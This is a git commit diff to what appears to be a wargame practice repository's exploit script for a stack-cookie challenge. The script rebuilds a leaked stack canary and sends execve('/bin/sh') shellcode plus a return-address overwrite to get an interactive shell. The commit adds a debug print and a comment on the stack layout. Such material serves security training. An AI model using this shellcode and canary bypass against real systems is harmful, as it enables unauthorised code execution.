9b770cb9a745eda32d083d8259e48192ba95c502
Anshul Singh <anshulspidy@gmail.com>
2025-06-24 07:59:12 +0200

    stack cookies lv2 done

--- ret2wargames/stack-cookies/05_lv2.py
+++ ret2wargames/stack-cookies/05_lv2.py
@@ -49,8 +49,10 @@ print(p.readuntil('quit)'))
 p.sendline('quit')
 
 cookie = (monster_val << 32) | treasure_val
+print(hex(cookie))
 
 shellcode = "\x48\x31\xC0\x50\x49\xBA\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05\x90\x90\x90"
-p.sendline(shellcode+'B'*8+p64(cookie)+p64(0x00007fffffffecd0))
+# 0x7fffffffecd0 is where the buffer starts i.e. rbp-0x30, 0x7fffffffed08 is where return address is taken from
+p.sendline(shellcode+'B'*8+p64(cookie)+'A'*8+p64(0x7fffffffecd0))
 
 p.interactive()
